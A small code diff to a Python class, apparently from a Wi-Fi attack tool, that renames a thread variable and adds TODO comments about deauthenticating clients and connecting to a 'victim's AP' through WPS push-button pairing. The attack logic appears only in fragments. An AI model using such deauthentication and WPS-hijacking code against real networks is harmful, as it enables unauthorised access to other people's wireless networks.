@@ -113,7 +113,7 @@ class WPS_PBC(object):
         self.going = True
         while self.going : #just stay here until going != True
             continue
-        self.tm.join()  #stop the timer
+        self.check.join()  #stop the checking if connected
         self.listener.join()  #stop the listener
 
     def wpa_setup(self):
@@ -144,17 +144,18 @@ class WPS_PBC(object):
         self.stop_deauth() #Stopping the deauth
         time.sleep(7) #give some time to the AP to come back
 
-        self.tm = threading.Thread(target=self.check_if_connected)
+        self.check = threading.Thread(target=self.check_if_connected)
         cli = subprocess.Popen(self.wpa_cli, shell=True, stdout=subprocess.PIPE, \
                                 stdin=subprocess.PIPE, stderr=subprocess.PIPE) #start the wps listener
-        self.tm.start() #start checking if we are connected
+        self.check.start() #start checking if we are connected
 
     def stop_deauth(self):
 
         """
         Stop deauthenticating
         """
-
+        #TODO : WE NEED TO CHANGE THE IFACE TO managed IN ORDER TO CONNECTED
+        #TO THE VICTIM'S AP
         self.deauth.stop_deauthentication()
 
     def deauth_rest(self):
@@ -219,7 +220,10 @@ class WPS_PBC(object):
         :return: False or the ip we got
         :rtype: bool or string
         """
-
+        #TODO : THIS IS NOT THE RIGHT WAY BECAUSE THE DEAUTH iface
+        #WILL STILL BE CONNECTED WITH THE FAKE IP, SO IF WE WANNA USE
+        #THIS METHOD WE NEED TO FIRST DISCONNECT FROM THE FAKE ONE FIRST
+        #AND ALSO CHECK THAT WE ARE CONNECTED TO THE RIGHT ONE ( ROUTE IS ENOUGH )
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         while 1:
             try :
